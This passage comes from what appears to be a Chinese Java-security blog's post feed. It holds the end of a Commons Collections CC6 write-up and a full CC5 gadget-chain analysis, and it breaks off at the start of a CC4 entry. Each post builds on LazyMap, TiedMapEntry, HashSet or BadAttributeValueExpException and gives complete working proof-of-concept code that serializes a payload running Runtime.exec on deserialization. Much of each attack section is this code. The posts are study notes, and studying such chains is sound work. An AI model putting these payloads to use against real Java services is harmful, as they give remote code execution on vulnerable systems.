class="literal">true</span>);</span><br><span class="line">        field.set(Lmap,transformerChain);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hs);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>实现效果：</p><p><img src="/posts/9758c0a8/cc6-19.png" title="实现效果"></p><h4 id="POC-2-1"><a href="#POC-2-1" class="headerlink" title="POC-2"></a>POC-2</h4><p>同实现思路一的POC-2的分析学习，规避本地序列化也可以通过反射修改key值<br>不过不同的是思路二用HashSet作为入口，因此在修改key值时，需要对HashSet中的map的table表中的key进行修改。<br>同时由于不修改链转换器，且添加的key值任意不为11即可，因此无需像POC-1那样删除key为11的元素。</p><p>因此先获取获取<code>hashset</code>中的<code>hashmap</code>对象属性</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取hashset中的hashmap对象属性</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">hsset</span> <span class="operator">=</span> HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">hsset.setAccessible(<span class="literal">true</span>);</span><br><span class="line">HashMap hsmap=(HashMap) hsset.get(hs);</span><br></pre></td></tr></table></figure><p>再获取hashmap中的table属性</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过反射获取HashMap表中的table字段属性</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Object[] tablearray = (Object[])table.get(hsmap);</span><br></pre></td></tr></table></figure><p>获取table属性过后，再获取table中存在的key值，并进行修改为目标触发的对象。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对node进行初始化</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> tablearray[<span class="number">0</span>];</span><br><span class="line"><span class="comment">//获取table表中目标元素，也就是要修改的元素,由于序号不同（比如我这是13），写了个直接遍历序号不为null的表示存在Key</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tablearray.length;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(tablearray[i]==<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    node = tablearray[i];</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//修改元素的key值为TiedMapEntry</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">key.set(node,TM);</span><br></pre></td></tr></table></figure><p>最后进行序列化和反序列化触发漏洞即可，得到完整POC：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">        HashSet hs=<span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hs.add(<span class="string">&quot;any&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//获取hashset中的hashmap对象属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">hsset</span> <span class="operator">=</span> HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        hsset.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        HashMap hsmap=(HashMap) hsset.get(hs);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射获取HashMap表中的table字段属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] tablearray = (Object[])table.get(hsmap);</span><br><span class="line">        <span class="comment">//对node进行初始化</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> tablearray[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">//获取table表中目标元素，也就是要修改的元素,由于序号不同（比如我这是13），写了个直接遍历序号不为null的表示存在Key</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tablearray.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tablearray[i]==<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            node = tablearray[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//修改元素的key值为TiedMapEntry</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        key.set(node,TM);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6payload-2.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hs);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6payload-2.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="0x04、总结"><a href="#0x04、总结" class="headerlink" title="0x04、总结"></a>0x04、总结</h1><p>本以为cc6跟前面cc4、5一样进行变式就行了理解起来很容易，但实际学习中虽然只改变入口为hashmap和hashset，但为了理解里面的原理踩了好些坑，也更了解了hashmap和hashset序列化的过程（包括通过反射去修改hashmap的key值），如果只是跟着网上的资料学习跟踪链的话，很多细节还是被直接过掉了，还是要尽可能学习逆向思维，找到为什么这段代码能触发，为什么要这么写，写成其他的为啥不行，被绕进去好几次，但最后还是理清楚了很多，学到了很多，但在默认的序列化功能源码上多少还有些不太明白理的清的地方。</p><h1 id="0x05、参考链接"><a href="#0x05、参考链接" class="headerlink" title="0x05、参考链接"></a>0x05、参考链接</h1><p><a href="https://www.runoob.com/manual/jdk11api/java.base/java/util/HashSet.html#method.detail">https://www.runoob.com/manual/jdk11api/java.base/java/util/HashSet.html#method.detail</a><br><a href="https://paper.seebug.org/1242/#commons-collections-6">https://paper.seebug.org/1242/#commons-collections-6</a><br>java漫谈</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-CC5链学习与分析</title>
      <link href="/posts/340e4601.html"/>
      <url>/posts/340e4601.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>重点上还是CC1、2两个链，后面都是变种或者加了一些新入口，依旧单独列出来方便整理，写一起太乱了。</p><h1 id="0x01、Apache-Commons-Collections描述"><a href="#0x01、Apache-Commons-Collections描述" class="headerlink" title="0x01、Apache Commons Collections描述"></a>0x01、Apache Commons Collections描述</h1><p>引用CC1链分析中的描述<br>CC链即Commons Collections利用链，主要针对Commons Collections组件发现的利用链。</p><blockquote><p>Apache Commons是Apache软件基金会的项目。Commons的目的是提供可重用的、开源的Java代码。<br>Apache Commons提供了很多工具类库，他们几乎不依赖其他第三方的类库，接口稳定，集成简单，可以大大提高编码效率和代码质量。<br>Apache Commons Collections 是对 java.util.Collection 的扩展。<br>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p></blockquote><p>目前 Collections 包有两个 commons-collections 和commons-collections4，commons-collections 最新版本是3.2.2，3系列版本也是只有3.2.2是安全的，不支持泛型，目前官方已不在维护。collections4 目前最新版本是4.4，其中4.0是存在漏洞，最低要求 Java8 以上。相对于 collections 来说完全支持 Java8 的特性并且支持泛型，该版本无法兼容旧有版本，于是为了避免冲突改名为 collections4。推荐直接使用该版本。（注：两个版本可以共存，使用时需要注意）</p><h1 id="0x02、环境准备"><a href="#0x02、环境准备" class="headerlink" title="0x02、环境准备"></a>0x02、环境准备</h1><p>java版本：jdk8u66（版本无限制）<br>Commons Collections：3.2.1（漏洞版本在3.1-3.2.1）<br>maven项目pom.xml文件中添加依赖</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>在idea访问<code>Commons Collections</code>组件的文件时候点击上方的下载源代码就可以看到对应文件的.java文件了</p><h1 id="0x03、分析"><a href="#0x03、分析" class="headerlink" title="0x03、分析"></a>0x03、分析</h1><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>CC5链基于CC1-LazyMap链进行的变式延伸，回顾CC1-LazyMap链：<br>CC1（LazyMap链）：</p><ul><li>生成LazyMap对象，将<code>InvokerTransformer</code>利用方法串起来的<code>ChainedTransformer</code>对象传入<code>LazyMap</code>构造方法，随后将LazyMap对象传入<code>AnnotationInvocationHandler</code>代理类。</li><li>通过动态代理，在生成二次代理对象时调用对象的<code>invoke</code>方法，其中<code>invoke</code>方法中调用<code>LazyMap.get()</code>方法、<code>get()</code>方法调用<code>ChainedTransformer.transform()</code>方法最后实现<code>InvokerTransformer.transform()</code>执行命令;</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>CC5在基于CC1-LazyMap链上引入了<code>TiedMapEntry</code>类和<code>BadAttributeValueExpException</code>类，其中<code>TiedMapEntry</code>类为<code>commons.collections</code>组件类，<code>BadAttributeValueExpException</code>类为jdk内置类。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br></pre></td></tr></table></figure><h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><p>回到LazyMap链的调用，在<code>get</code>方法中，判断map对象中的Key是否存在传入的key，不存在就新建一个value值去put入map对象中，其中便调用了<code>factory.transform(key)</code></p><p><img src="/posts/340e4601/cc5-1.png" title="LazyMap.get()"></p><p>其中<code>factory</code>为构造方法传入赋值的，因此构造参数传入<code>ChainedTransformer</code>类对象，变可执行<code>ChainedTransformer.transform(key)</code>方法执行代码</p><p><img src="/posts/340e4601/cc5-2.png" title="LazyMap构造方法"></p><p>由于构造方法是保护限制，但存在decorate方法去返回实例化LazyMap对象并调用构造方法</p><p><img src="/posts/340e4601/cc5-3.png" title="decorate方法"></p><p>利用点知道了，LazyMap链就是通过动态代理最后去调用到get方法。</p><h3 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h3><p>接下来就是找还有哪些类可以作为利用链调用的，就延伸出来<code>TiedMapEntry</code>类</p><p><img src="/posts/340e4601/cc5-4.png" title="get方法"></p><p>其中map对象是由构造方法传入的Map类型的对象</p><p><img src="/posts/340e4601/cc5-5.png" title="构造方法"></p><p>接下来就找在哪调用了<code>getValue()</code>方法</p><p><img src="/posts/340e4601/cc5-6.png" title="调用情况"></p><p>其中在本类有3个方法进行了调用<br><code>equals()</code>、<code>hashCode()</code>、<code>toString()</code></p><p>还需要一个序列化入口去调用其中的方法。</p><h3 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h3><p>这时延伸出<code>BadAttributeValueExpException</code>类，<code>BadAttributeValueExpException</code>类为<code>Exception</code>类的子类，实现了序列化，并重写了<code>readObject</code>反序列化方法</p><p><img src="/posts/340e4601/cc5-7.png" title="调用情况"></p><p>相关注释：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">//读取序列化字段</span></span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">        <span class="comment">//获取序列化val字段的值</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//判断该值是否为null</span></span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">            val = <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">//不为null的话再判断该值是否是String类型</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        <span class="comment">//不为空且不为String类型的话，再判断当前系统安全管理器是否存在，默认不存在返回null，或者判断值是否为其他类型中一种</span></span><br><span class="line">        <span class="comment">//代码意思为如果val的值不是String类型的话就给他.toString()转化为字符串类型</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">            <span class="comment">//执行toString()</span></span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>因此为了执行<code>TiedMapEntry.toString()</code>方法，需要传入<code>val</code>字段值为<code>TiedMapEntry</code>对象，因为当前系统安全管理器默认不存在返回<code>null</code>，因此会执行<code>valObj.toString()</code>达到代码执行的目的</p><p>接下来只需要向<code>val</code>字段传入<code>TiedMapEntry</code>对象作为值即可，这里有<code>BadAttributeValueExpException</code>构造方法对val进行赋值</p><p><img src="/posts/340e4601/cc5-8.png" title="构造方法"></p><p>这里判断<code>val</code>是否为<code>null</code>,如果不为<code>null</code>，则直接执行<code>val.toString()</code></p><p>由于该构造方法直接调用时，便会执行<code>val.toString()</code>，因此在编写poc生成序列化的时候，便会在本地触发<code>val.toString()</code>造成代码执行。</p><p><img src="/posts/340e4601/cc5-9.png" title="本地执行"></p><p>同时在反序列化时发现并不会触发漏洞，断点查看val值已经变成进程对象</p><p><img src="/posts/340e4601/cc5-10.png" title="val"></p><p>因为在序列化过程前，代码执行到<code>BadAttributeValueExpException</code>调用构造方法触发代码后，<code>val</code>的值已经被运行完后赋值，返回<code>getKey() + &quot;=&quot; + getValue()</code>即上图中的值，此时的val值不再是<code>TiedMapEntry</code>对象，因此无法反序列化触发漏洞</p><p><img src="/posts/340e4601/cc5-11.png" title="val"></p><p>可通过反射对val值进行赋值成<code>TiedMapEntry</code>对象，可规避这个问题，至此，利用链完成。</p><h2 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h2><p>首先CC1-LazyMap链的前半段没有变化（也就是ChainedTransformer触发点），可直接使用</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="comment">//获取Runtime类对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>接着创建Map对象，通过调用decorate方法实例化LazyMap对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChain);</span><br></pre></td></tr></table></figure><p>然后<code>TiedMapEntry</code>对象，为了通过<code>toString()</code>调用<code>getValue()</code>方法中的<code>map.get()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//传入LazyMap对象，key随便设置例如下11</span></span><br><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br></pre></td></tr></table></figure><p>最后通过<code>BadAttributeValueExpException</code>类调用<code>TiedMapEntry.toString()</code>方法，并通过反射设置<code>val</code>值为TiedMapEntry对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException BV=<span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">111</span>);</span><br><span class="line">Field field=BV.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(BV,Lmap);</span><br></pre></td></tr></table></figure><p>最后序列化，反序列化触发代码执行。</p><p>完整POC:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">        BadAttributeValueExpException BV=<span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">111</span>);</span><br><span class="line">        <span class="comment">//通过反射设置val值为TiedMapEntry对象</span></span><br><span class="line">        Field field=BV.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(BV,TM);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc5payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(BV);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc5payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>实现demo：</p><p><img src="/posts/340e4601/cc5-12.png" title="实现demo"></p><h1 id="0x04、总结"><a href="#0x04、总结" class="headerlink" title="0x04、总结"></a>0x04、总结</h1><p>CC5在CC1-LazyMap链后半段通过BadAttributeValueExpException类调用TiedMapEntry.toString()方法达到执行效果，相对调用比较简单，但反向思维通过LazyMap跳到TiedMapEntry类去调用确实很难逆向去想到，调用类实在太多了，只有通过查看POC进行正向分析。</p><h1 id="0x05、参考链接"><a href="#0x05、参考链接" class="headerlink" title="0x05、参考链接"></a>0x05、参考链接</h1><p><a href="https://paper.seebug.org/1242/">https://paper.seebug.org/1242/</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-CC4链学习与分析</title>
      <link href="/posts/e3ecc659.html"/>
      <url>/posts/e3ecc659.html</url>
      
